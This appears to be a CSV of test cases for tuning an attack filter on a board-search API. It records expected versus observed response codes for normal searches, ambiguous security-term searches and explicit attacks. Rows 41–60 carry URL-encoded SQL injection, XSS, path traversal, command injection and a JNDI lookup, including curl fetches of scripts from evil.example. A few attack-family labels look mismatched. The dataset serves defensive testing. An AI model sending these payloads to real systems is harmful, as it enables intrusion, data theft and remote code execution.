sample_id,source_file,case_id,group_name,intent_class,method,target,payload_or_query,interpretation,attack_family,expected_code,expected_meaning,observed_off,observed_on,response_code_transition,current_assessment
33,board-search-fp-mixed-100.csv,board_search_033,Board Search Mixed,ambiguous,GET,/api/board/posts,?keyword=powershell%20-enc%20%EC%98%88%EC%8B%9C&sort=latest&page=0&size=6,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,command_injection,200,authenticated_board_search_should_return_results_or_empty,403,400,403 -> 400,partial_change_needs_review
34,board-search-fp-mixed-100.csv,board_search_034,Board Search Mixed,ambiguous,GET,/api/board/posts,?keyword=%3Cimg%20onerror%3E%20%ED%95%84%ED%84%B0%EB%A7%81&sort=title&page=1&size=5,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,xss,200,authenticated_board_search_should_return_results_or_empty,403,200,403 -> 200,resolved_after_tuning
35,board-search-fp-mixed-100.csv,board_search_035,Board Search Mixed,ambiguous,GET,/api/board/posts,?keyword=SQL%20injection%20%EB%B3%B4%EA%B3%A0%EC%84%9C&sort=latest&page=0&size=5,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,sqli,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
36,board-search-fp-mixed-100.csv,board_search_036,Board Search Mixed,ambiguous,GET,/api/board/posts,?keyword=XSS%20payload%20%EC%98%88%EC%8B%9C&sort=title&page=1&size=6,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,xss,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
37,board-search-fp-mixed-100.csv,board_search_037,Board Search Mixed,ambiguous,GET,/api/board/posts,?keyword=LFI%20..%2F%20%EA%B2%BD%EB%A1%9C&sort=latest&page=0&size=5,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,path_traversal,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
38,board-search-fp-mixed-100.csv,board_search_038,Board Search Mixed,ambiguous,GET,/api/board/posts,?keyword=UNION%20ALL%20SELECT%20%EC%8B%A4%EC%8A%B5&sort=title&page=1&size=5,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,sqli,200,authenticated_board_search_should_return_results_or_empty,403,400,403 -> 400,partial_change_needs_review
39,board-search-fp-mixed-100.csv,board_search_039,Board Search Mixed,ambiguous,GET,/api/board/posts,?keyword=base64%20%EC%9D%B8%EC%BD%94%EB%94%A9%20%EC%9A%B0%ED%9A%8C&sort=latest&page=0&size=6,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,route_typo,200,authenticated_board_search_should_return_results_or_empty,403,200,403 -> 200,resolved_after_tuning
40,board-search-fp-mixed-100.csv,board_search_040,Board Search Mixed,ambiguous,GET,/api/board/posts,?keyword=shellshock%28%29%20%7B%20%3A%3B%7D%3B%20note&sort=title&page=1&size=5,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,command_injection,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
41,board-search-fp-mixed-100.csv,board_search_041,Board Search Mixed,attack,GET,/api/board/posts,?keyword=%27%20OR%201%3D1%20--&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,sqli,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
42,board-search-fp-mixed-100.csv,board_search_042,Board Search Mixed,attack,GET,/api/board/posts,?keyword=%22%20or%20%221%22%3D%221&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,sqli,400,explicit_attack_search_term_should_be_rejected,403,200,403 -> 200,missed_detection
43,board-search-fp-mixed-100.csv,board_search_043,Board Search Mixed,attack,GET,/api/board/posts,?keyword=union%20select%20password%20from%20users--&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,sqli,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
44,board-search-fp-mixed-100.csv,board_search_044,Board Search Mixed,attack,GET,/api/board/posts,?keyword=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,xss,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
45,board-search-fp-mixed-100.csv,board_search_045,Board Search Mixed,attack,GET,/api/board/posts,?keyword=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,xss,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
46,board-search-fp-mixed-100.csv,board_search_046,Board Search Mixed,attack,GET,/api/board/posts,?keyword=..%2F..%2F..%2F..%2Fetc%2Fpasswd&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,path_traversal,400,explicit_attack_search_term_should_be_rejected,403,403,403 -> 403,needs_review
47,board-search-fp-mixed-100.csv,board_search_047,Board Search Mixed,attack,GET,/api/board/posts,?keyword=..%252f..%252f..%252fetc%2Fpasswd&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,normal_business_request,400,explicit_attack_search_term_should_be_rejected,403,403,403 -> 403,needs_review
48,board-search-fp-mixed-100.csv,board_search_048,Board Search Mixed,attack,GET,/api/board/posts,?keyword=%3Bwhoami&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,command_injection,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
49,board-search-fp-mixed-100.csv,board_search_049,Board Search Mixed,attack,GET,/api/board/posts,?keyword=%7Ccat%20%2Fetc%2Fpasswd&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,path_traversal,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
50,board-search-fp-mixed-100.csv,board_search_050,Board Search Mixed,attack,GET,/api/board/posts,?keyword=%26%26%20curl%20http%3A%2F%2Fevil.example%2Fa.sh&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,command_injection,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
51,board-search-fp-mixed-100.csv,board_search_051,Board Search Mixed,attack,GET,/api/board/posts,?keyword=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,jndi_injection,400,explicit_attack_search_term_should_be_rejected,403,403,403 -> 403,needs_review
52,board-search-fp-mixed-100.csv,board_search_052,Board Search Mixed,attack,GET,/api/board/posts,?keyword=admin%27--&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,sqli,400,explicit_attack_search_term_should_be_rejected,403,200,403 -> 200,missed_detection
53,board-search-fp-mixed-100.csv,board_search_053,Board Search Mixed,attack,GET,/api/board/posts,?keyword=1%3Bdrop%20table%20users&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,sqli,400,explicit_attack_search_term_should_be_rejected,403,200,403 -> 200,missed_detection
54,board-search-fp-mixed-100.csv,board_search_054,Board Search Mixed,attack,GET,/api/board/posts,?keyword=benchmark%281000000%2Cmd5%281%29%29&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,sqli,400,explicit_attack_search_term_should_be_rejected,403,403,403 -> 403,needs_review
55,board-search-fp-mixed-100.csv,board_search_055,Board Search Mixed,attack,GET,/api/board/posts,?keyword=waitfor%20delay%20%270%3A0%3A5%27--&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,sqli,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
56,board-search-fp-mixed-100.csv,board_search_056,Board Search Mixed,attack,GET,/api/board/posts,?keyword=sleep%285%29&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,sqli,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
57,board-search-fp-mixed-100.csv,board_search_057,Board Search Mixed,attack,GET,/api/board/posts,?keyword=%2527%2520or%25201%3D1--&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,normal_business_request,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
58,board-search-fp-mixed-100.csv,board_search_058,Board Search Mixed,attack,GET,/api/board/posts,?keyword=%60id%60&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,command_injection,400,explicit_attack_search_term_should_be_rejected,400,400,400 -> 400,as_designed
59,board-search-fp-mixed-100.csv,board_search_059,Board Search Mixed,attack,GET,/api/board/posts,?keyword=%24%28curl%20evil.example%2Fpoc.sh%29&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,command_injection,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
60,board-search-fp-mixed-100.csv,board_search_060,Board Search Mixed,attack,GET,/api/board/posts,?keyword=..%2F..%2F..%2Fboot.ini&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,path_traversal,400,explicit_attack_search_term_should_be_rejected,403,403,403 -> 403,needs_review
61,board-search-fp-mixed-100.csv,board_search_061,Board Search Mixed,normal,GET,/api/board/posts,?author=student1&sort=latest&page=0&size=5,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
62,board-search-fp-mixed-100.csv,board_search_062,Board Search Mixed,normal,GET,/api/board/posts,?author=student1&sort=title&page=0&size=6,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
63,board-search-fp-mixed-100.csv,board_search_063,Board Search Mixed,normal,GET,/api/board/posts,?author=student2&sort=latest&page=1&size=5,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
64,board-search-fp-mixed-100.csv,board_search_064,Board Search Mixed,normal,GET,/api/board/posts,?author=student2&sort=title&page=0&size=6,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
65,board-search-fp-mixed-100.csv,board_search_065,Board Search Mixed,normal,GET,/api/board/posts,?author=%EA%B9%80%EB%AF%BC%EC%A7%80&sort=latest&page=0&size=5,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
66,board-search-fp-mixed-100.csv,board_search_066,Board Search Mixed,normal,GET,/api/board/posts,?author=%EA%B9%80%EB%AF%BC%EC%A7%80&sort=title&page=0&size=6,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
67,board-search-fp-mixed-100.csv,board_search_067,Board Search Mixed,normal,GET,/api/board/posts,?author=%EA%B0%95%ED%95%B4%EB%A6%B0&sort=latest&page=1&size=5,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
68,board-search-fp-mixed-100.csv,board_search_068,Board Search Mixed,normal,GET,/api/board/posts,?author=%EA%B0%95%ED%95%B4%EB%A6%B0&sort=title&page=0&size=6,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
69,board-search-fp-mixed-100.csv,board_search_069,Board Search Mixed,normal,GET,/api/board/posts,?author=%EC%9E%A5%EC%9B%90%EC%98%81&sort=latest&page=0&size=5,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
70,board-search-fp-mixed-100.csv,board_search_070,Board Search Mixed,normal,GET,/api/board/posts,?author=%EC%9E%A5%EC%9B%90%EC%98%81&sort=title&page=0&size=6,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
71,board-search-fp-mixed-100.csv,board_search_071,Board Search Mixed,normal,GET,/api/board/posts,?keyword=wifi&dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=6,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
72,board-search-fp-mixed-100.csv,board_search_072,Board Search Mixed,normal,GET,/api/board/posts,?keyword=select%20%EB%AC%B8%20%EC%A0%95%EB%A6%AC&dateFrom=2026-03-01&dateTo=2026-03-31&sort=title&page=0&size=5,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,route_typo,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
73,board-search-fp-mixed-100.csv,board_search_073,Board Search Mixed,normal,GET,/api/board/posts,?keyword=%EB%8F%84%EC%84%9C%EA%B4%80&dateFrom=2026-02-01&dateTo=2026-03-15&sort=latest&page=0&size=6,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
74,board-search-fp-mixed-100.csv,board_search_074,Board Search Mixed,normal,GET,/api/board/posts,?keyword=union%20select%20%EC%98%88%EC%8B%9C&dateFrom=2026-02-01&dateTo=2026-03-15&sort=title&page=0&size=5,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,sqli,200,authenticated_board_search_should_return_results_or_empty,403,400,403 -> 400,partial_change_needs_review
75,board-search-fp-mixed-100.csv,board_search_075,Board Search Mixed,normal,GET,/api/board/posts,?keyword=%EC%9E%A5%ED%95%99%EA%B8%88&dateFrom=2026-01-01&dateTo=2026-12-31&sort=latest&page=0&size=6,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
76,board-search-fp-mixed-100.csv,board_search_076,Board Search Mixed,normal,GET,/api/board/posts,?keyword=script%20%ED%83%9C%EA%B7%B8%20%ED%95%84%ED%84%B0%EB%A7%81&dateFrom=2026-01-01&dateTo=2026-12-31&sort=title&page=0&size=5,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,route_typo,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
